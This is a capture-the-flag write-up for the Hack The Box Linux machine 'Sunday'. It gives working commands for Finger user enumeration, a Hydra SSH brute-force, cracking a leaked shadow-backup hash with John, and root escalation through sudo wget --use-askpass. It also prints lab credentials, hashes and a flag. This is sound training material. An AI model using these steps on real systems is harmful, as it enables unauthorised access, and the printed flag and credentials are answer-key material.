# Hack The Box — Sunday

**Machine:** Sunday
**Difficulty:** Medium
**OS:** Linux
**IP:** `10.129.78.98`

---

## Overview

Sunday is a Medium-rated Linux machine that demonstrates the importance of **legacy service enumeration**, **user enumeration through the Finger protocol**, **SSH password attacks**, **credential recovery from backup files**, and **sudo privilege escalation**.

The attack path begins with a Finger service running on port `79`. User enumeration reveals valid system accounts, while a second full-port scan uncovers an SSH service running on the non-standard port `22022`.

After obtaining access as `sunny`, an exposed backup directory provides a copy of the system's password hashes. The hash belonging to `sammy` is cracked, allowing lateral movement to the `sammy` account.

Finally, `sammy` has passwordless sudo access to `wget`, which can be abused to obtain a root shell.

---

# 1. Reconnaissance

We start with an Nmap scan against the target.

```bash
nmap 10.129.78.98
```

The initial results:

```text
PORT    STATE SERVICE
79/tcp  open  finger
111/tcp open  rpcbind
515/tcp open  printer
```

At this point, only three TCP ports were visible.

Since services can also be exposed on higher ports, an all-port scan was started in the background.

---

# 2. Service Enumeration

Next, we perform service and version detection:

```bash
nmap -sC -sV 10.129.78.98
```

The results showed:

```text
PORT    STATE SERVICE VERSION
79/tcp  open  finger?
111/tcp open  rpcbind  2-4 (RPC #100000)
515/tcp open  printer
```

Port `79` was particularly interesting.

---

# 3. Finger Service Enumeration

Port `79` is used by the legacy **Finger protocol**, which can provide information about users on a remote system.

We connected directly to the service:

```bash
nc -vn 10.129.78.98 79
```

The service responded with:

```text
Login       Name               TTY         Idle    When    Where
```

We also tested a simple request:

```bash
printf '\r\n' | nc -vn 10.129.78.98 79
```

Which returned:

```text
No one logged on
```

We then used the `finger` command:

```bash
finger @10.129.78.98
```

Again:

```text
No one logged on
```

Although no users were currently logged in, the Finger service was still useful for further enumeration.

---

# 4. Enumerating Users

Metasploit contains a Finger enumeration module that can identify valid users.

```text
auxiliary/scanner/finger/finger_users
```

The scan returned a list of system accounts including:

```text
_ntp
adm
aiuser
bin
daemon
dhcpserv
dladm
ftp
ikeuser
lp
netadm
netcfg
noaccess
nobody
nobody4
openldap
root
sshd
sys
```

Further Finger enumeration eventually identified three interesting users:

```text
root
sammy
sunny
```

The Finger service therefore gave us a potential username list to investigate.

---

# 5. Discovering the SSH Service

The initial scan did not reveal an SSH service.

However, the all-port scan eventually discovered:

```text
22022/tcp open ssh
```

We performed service detection against the port:

```bash
nmap -sC -sV -p 22022 10.129.78.98
```

The result:

```text
PORT      STATE SERVICE VERSION
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
```

Now we had an SSH service and three potential usernames.

---

# 6. Brute-Forcing SSH Credentials

We tested the discovered `sunny` account against the SSH service using Hydra:

```bash
hydra -l sunny -P /usr/share/wordlists/rockyou.txt \
-s 22022 ssh://10.129.78.98
```

The valid credentials were discovered:

```text
Username: sunny
Password: sunday
```

We could now connect through SSH:

```bash
ssh sunny@10.129.78.98 -p 22022
```

---

# 7. Privilege Escalation — Sunny to Sammy

After obtaining a shell as `sunny`, the `user.txt` flag was not directly accessible.

We began looking for interesting files and directories.

One particularly interesting directory was:

```bash
cd /backup
ls
```

Output:

```text
agent22.backup
shadow.backup
```

The `shadow.backup` file was readable.

```bash
cat shadow.backup
```

This revealed password hashes, including:

```text
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

The hash format indicated `sha256crypt`.

---

# 8. Crack Sammy's Password

We saved Sammy's hash to a file and used John the Ripper:

```bash
john sammy --wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully cracked the password:

```text
cooldude!        (sammy)
```

We could now switch to the `sammy` account.

```bash
su sammy
```

Or connect through SSH using the recovered credentials.

---

# 9. User Flag

As `sammy`, we checked the home directory:

```bash
sammy@sunday:/home/sammy$ ls
```

The `user.txt` file was present.

```bash
cat user.txt
```

This revealed the user flag:

```text
0147028b476686688f362c5890cc71e0
```

---

# 10. Privilege Escalation — Sammy to Root

Next, we checked the sudo permissions:

```bash
sudo -l
```

The result was:

```text
User sammy may run the following commands on sunday:
    (root) NOPASSWD: /usr/bin/wget
```

This was the key privilege escalation opportunity.

The `sammy` user could execute `wget` as root without entering a password.

---

# 11. Abusing Wget

We created a small script:

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' > /tmp/test
```

Then made it executable:

```bash
chmod +x /tmp/test
```

We used `wget`'s `--use-askpass` functionality to execute the script with root privileges:

```bash
sudo /usr/bin/wget --use-askpass=/tmp/test 0
```

This resulted in a root shell:

```text
root@sunday:/home/sammy#
```

We had successfully escalated from:

```text
sunny
   ↓
sammy
   ↓
root
```

---

# 12. Root Access

We verified our privileges:

```bash
whoami
```

Expected result:

```text
root
```

We could now access the root filesystem and retrieve the root flag.

---

# Attack Path

```text
Nmap
  ↓
Finger (79)
  ↓
User Enumeration
  ↓
Full Port Scan
  ↓
SSH (22022)
  ↓
sunny:sunday
  ↓
/backup/shadow.backup
  ↓
Sammy Password Hash
  ↓
John the Ripper
  ↓
sammy:cooldude!
  ↓
user.txt
  ↓
sudo -l
  ↓
NOPASSWD: /usr/bin/wget
  ↓
Wget Abuse
  ↓
root
  ↓
root.txt
```

---

# Key Takeaways

* Don't rely only on the default 1,000 Nmap ports.
* Legacy services such as **Finger** can disclose valuable username information.
* Non-standard ports should always be investigated.
* Backup files can contain extremely sensitive authentication information.
* Password hashes should be identified by their format before attempting to crack them.
* Always run `sudo -l` after obtaining a Linux shell.
* Even a seemingly harmless binary such as `wget` can become a privilege-escalation vector when granted unrestricted sudo access.

---

## Tools Used

* Nmap
* Netcat
* Finger
* Metasploit
* Hydra
* John the Ripper
* SSH
* Wget

---

## Conclusion

Sunday was a great demonstration of why thorough enumeration matters.

The initial scan exposed only a few services, but deeper enumeration revealed the hidden SSH service on port `22022`. The Finger service helped identify valid usernames, which eventually led to SSH access as `sunny`.

From there, a readable backup of password hashes allowed us to recover Sammy's credentials. Finally, an unsafe `NOPASSWD` sudo permission for `wget` provided a path to root.

The biggest lesson from Sunday is simple:

**Enumerate everything, including the services and files that initially look unimportant.**
